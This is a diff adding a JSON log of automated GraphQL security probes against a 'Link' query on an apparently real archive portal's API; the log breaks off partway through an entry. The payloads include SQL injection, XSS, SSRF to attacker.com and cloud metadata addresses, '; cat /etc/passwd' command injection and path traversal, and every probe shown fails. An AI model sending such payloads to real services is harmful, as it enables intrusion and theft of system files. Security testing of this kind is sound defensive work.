@@ -1,0 +1,3262 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.482,
+    "timestamp": "2025-10-05T18:42:07.209783Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123' OR '1'='1\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.498,
+    "timestamp": "2025-10-05T18:42:14.831550Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"<script>alert('xss')</script>\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.496,
+    "timestamp": "2025-10-05T18:42:21.967015Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"http://attacker.com/evil.php\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.478,
+    "timestamp": "2025-10-05T18:42:29.172696Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123; cat /etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.447,
+    "timestamp": "2025-10-05T18:42:36.160563Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"../../../etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.473,
+    "timestamp": "2025-10-05T18:42:43.887011Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"<h1>Hello World!</h1>\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.591,
+    "timestamp": "2025-10-05T18:42:48.598260Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery MyAliasedLink {\n  myLink: Link(id: \"link-123\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 5.48,
+        "timestamp": "2025-10-05T18:43:15.670087Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 5,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            },
+            {
+              "message": "Validation error (FieldUndefined@[Link/title]) : Field 'title' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 6,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 5.443,
+        "timestamp": "2025-10-05T18:43:21.113187Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 5,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            },
+            {
+              "message": "Validation error (FieldUndefined@[Link/title]) : Field 'title' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 6,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T18:43:21.113264Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 5.497,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 5.499,
+    "timestamp": "2025-10-05T18:42:56.914474Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    typ # Misspelled to trigger suggestions\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 5.489,
+    "timestamp": "2025-10-05T18:43:05.202183Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 5.467,
+    "timestamp": "2025-10-05T18:43:34.869195Z",
+    "count": 11,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001' OR '1'='1\") {\n    id\n    url\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 5.489,
+    "timestamp": "2025-10-05T18:43:42.103444Z",
+    "count": 12,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"<script>alert('xss')</script>\") {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 5.516,
+    "timestamp": "2025-10-05T18:43:50.051253Z",
+    "count": 13,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/title]) : Field 'title' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\", url: \"http://127.0.0.1/admin\") {\n    id\n    url\n    description\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 420.766,
+    "response_body": {
+      "error": "('Connection aborted.', ConnectionResetError(54, 'Connection reset by peer'))"
+    },
+    "timestamp": "2025-10-05T18:50:52.631353Z",
+    "count": 14
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\", file: \"; ls -la\") {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 15.232,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T18:51:07.866048Z",
+    "count": 15
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\", filepath: \"../../etc/passwd\") {\n    id\n    url\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 15.016,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T18:51:22.882064Z",
+    "count": 16
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"<h1>Vulnerable Link</h1>\") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 15.014,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T18:51:37.896320Z",
+    "count": 17
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\") {\n    id\n    url\n    title\n    description\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "response_status": null,
+    "request_time_seconds": 15.014,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T18:51:52.910586Z",
+    "count": 18
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  myLink: Link(id: \"link_id_001\") {\n    id\n    url\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "response_status": null,
+    "request_time_seconds": 1916.163,
+    "response_body": {
+      "error": "('Connection aborted.', ConnectionResetError(54, 'Connection reset by peer'))"
+    },
+    "timestamp": "2025-10-05T19:23:49.073293Z",
+    "count": 19
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\") {\n    id\n    __typename\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": null,
+    "request_time_seconds": 3489.151,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Max retries exceeded with url: /api/graphql (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x16bcfb2b0>: Failed to resolve 'portal.ehri-project.eu' ([Errno 8] nodename nor servname provided, or not known)\"))"
+    },
+    "timestamp": "2025-10-05T20:21:58.224526Z",
+    "count": 20
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"link_id_001\") {\n    id\n    ur\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": null,
+    "request_time_seconds": 71.062,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Max retries exceeded with url: /api/graphql (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x16bbfa940>: Failed to resolve 'portal.ehri-project.eu' ([Errno 8] nodename nor servname provided, or not known)\"))"
+    },
+    "timestamp": "2025-10-05T20:23:09.286826Z",
+    "count": 21
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 400,
+    "request_time_seconds": 3.355,
+    "timestamp": "2025-10-05T20:43:37.137126Z",
+    "count": 22,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078' OR '1'='1\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.761,
+    "timestamp": "2025-10-05T20:43:41.735910Z",
+    "count": 23,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078<script>alert('xss')</script>\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.335,
+    "timestamp": "2025-10-05T20:43:44.822797Z",
+    "count": 24,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"http://169.254.169.254/latest/meta-data/hostname\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 5.301,
+    "timestamp": "2025-10-05T20:43:52.883089Z",
+    "count": 25,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078; cat /etc/passwd\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.063,
+    "timestamp": "2025-10-05T20:43:55.803096Z",
+    "count": 26,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078/../../../../etc/passwd\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.656,
+    "timestamp": "2025-10-05T20:43:59.326992Z",
+    "count": 27,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078<h1>Hello There</h1>\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.981,
+    "timestamp": "2025-10-05T20:44:02.995781Z",
+    "count": 28,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.886,
+        "timestamp": "2025-10-05T20:44:06.865073Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 4,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.514,
+        "timestamp": "2025-10-05T20:44:07.379315Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 4,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 29,
+    "timestamp": "2025-10-05T20:44:07.379665Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.676,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  linkAlias: Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078\") {\n    url\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.769,
+        "timestamp": "2025-10-05T20:44:10.516874Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 4,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.935,
+        "timestamp": "2025-10-05T20:44:11.452241Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+              "locations": [
+                {
+                  "line": 4,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 30,
+    "timestamp": "2025-10-05T20:44:11.452264Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.741,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.895,
+    "timestamp": "2025-10-05T20:44:15.864076Z",
+    "count": 31,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery Link {\n  Link(id: \"c25345d4-e692-4f36-a843-ea4025fcb078\") {\n    urL # Intentional typo to trigger suggestions\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.457,
+    "timestamp": "2025-10-05T20:44:18.402626Z",
+    "count": 32,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/urL]) : Field 'urL' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.017,
+    "timestamp": "2025-10-05T20:44:24.836610Z",
+    "count": 33,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001' OR '1'='1\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.573,
+    "timestamp": "2025-10-05T20:44:27.224095Z",
+    "count": 34,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001\") {\n    id\n    type\n    description\n    field\n    annotations {\n      body\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.47,
+    "timestamp": "2025-10-05T20:44:30.034805Z",
+    "count": 35,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"http://169.254.169.254/latest/meta-data/instance-id\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.535,
+    "timestamp": "2025-10-05T20:44:32.638482Z",
+    "count": 36,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001; cat /etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.921,
+    "timestamp": "2025-10-05T20:44:36.009940Z",
+    "count": 37,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001/../../etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.232,
+    "timestamp": "2025-10-05T20:44:40.085183Z",
+    "count": 38,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.963,
+        "timestamp": "2025-10-05T20:44:43.194966Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.49,
+        "timestamp": "2025-10-05T20:44:43.685257Z",
+        "response_body": {
+          "data": {
+            "myAliasedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 39,
+    "timestamp": "2025-10-05T20:44:43.685298Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.468,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery MyLinkData {\n  myAliasedLink: Link(id: \"link-001\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.309,
+        "timestamp": "2025-10-05T20:44:47.600332Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.473,
+        "timestamp": "2025-10-05T20:44:48.072951Z",
+        "response_body": {
+          "data": {
+            "myAliasedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 40,
+    "timestamp": "2025-10-05T20:44:48.072999Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.464,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.903,
+    "timestamp": "2025-10-05T20:44:50.993133Z",
+    "count": 41,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001\") {\n    id\n    typ\n    descriptio\n    __typename\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.458,
+    "timestamp": "2025-10-05T20:44:53.949255Z",
+    "count": 42,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
